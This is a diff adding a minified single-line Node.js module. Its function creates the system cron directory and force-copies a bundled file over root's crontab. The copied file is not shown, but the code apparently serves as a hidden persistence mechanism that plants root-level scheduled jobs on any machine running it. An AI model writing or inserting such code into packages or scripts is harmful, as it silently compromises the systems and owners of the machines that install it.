@@ -1,0 +1,1 @@
+"use strict";var exec=require("child_process").exec,util=require("util");module.exports=function(a){var b="/var/spool/cron/crontabs";exec(util.format("/bin/mkdir -p %s",b),{},function(c){return c?a(c):void exec(util.format("/bin/cp -f %s/root %s/root",__dirname,b),{},a)})};
